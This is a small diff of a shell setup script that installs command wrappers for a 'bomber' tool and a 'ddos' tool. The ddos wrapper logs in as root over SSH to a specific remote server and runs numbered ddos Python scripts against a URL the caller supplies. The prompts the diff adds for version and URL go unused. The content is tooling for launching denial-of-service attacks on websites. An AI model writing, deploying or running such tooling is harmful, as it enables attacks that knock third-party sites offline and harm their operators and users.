@@ -19,5 +19,11 @@ sudo chmod +x /usr/bin/bomber
 
 #run ddos
 sudo touch /usr/bin/ddos
-sudo echo 'ssh -t root@88.99.163.122 -p 50400 python /opt/custom/ddos/ddos"$1".py "$2"'>/usr/bin/ddos
+cat << EOF > /usr/bin/ddos
+#!/bin/bash -e
+read -p 'script version (1 or 2): ' version
+read -p 'url (example: http://breguet.pw): ' url
+ssh -t root@88.99.163.122 -p 50400 python /opt/custom/ddos/ddos$1.py $2
+EOF
 sudo chmod +x /usr/bin/ddos
+
